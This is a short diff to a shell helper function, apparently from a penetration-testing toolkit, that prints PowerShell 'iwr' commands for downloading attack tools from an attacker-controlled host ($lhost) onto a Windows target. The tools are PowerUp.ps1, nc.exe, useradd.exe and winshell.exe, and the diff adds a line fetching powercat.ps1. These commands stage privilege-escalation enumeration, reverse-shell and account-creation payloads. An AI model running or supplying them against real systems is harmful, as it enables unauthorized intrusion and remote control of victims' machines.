@@ -102,6 +102,7 @@ list_stuff() {
     echo "iwr -uri http://$lhost/enum/PowerUp.ps1 -OutFile PowerUp.ps1"
     echo ""
     echo "iwr -uri http://$lhost/payloads/nc.exe -OutFile nc.exe"
+    echo "iwr -uri http://$lhost/payloads/powercat.ps1 -OutFile powercat.ps1"
     echo "iwr -uri http://$lhost/payloads/useradd.exe -OutFile useradd.exe"
     echo "iwr -uri http://$lhost/payloads/winshell.exe -OutFile winshell.exe"
     echo ""
